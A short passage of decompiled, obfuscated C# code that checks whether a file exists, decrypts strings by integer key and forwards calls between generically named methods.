		if (File.Exists(Class6.smethod_8() + Class6.string_4))
		{
			separator = new char[1] { '!' };
			method_12(null, Class11.smethod_0(-2094345812).Split(separator)[0] + Class6.smethod_8() + Class6.string_3, bool_8: false);
		}
	}

	private void method_24()
	{
		gclass1_0.method_2();
	}

	private void method_25()
	{
		method_22(Class11.smethod_0(-2094345790).Split(new char[1] { '|' })[0]);
	}

	private void method_26()
	{
		method_6();
	}

	private void method_27()
	{
		method_21();
	}

	private void method_28()
	{
		method_9();
	}
}
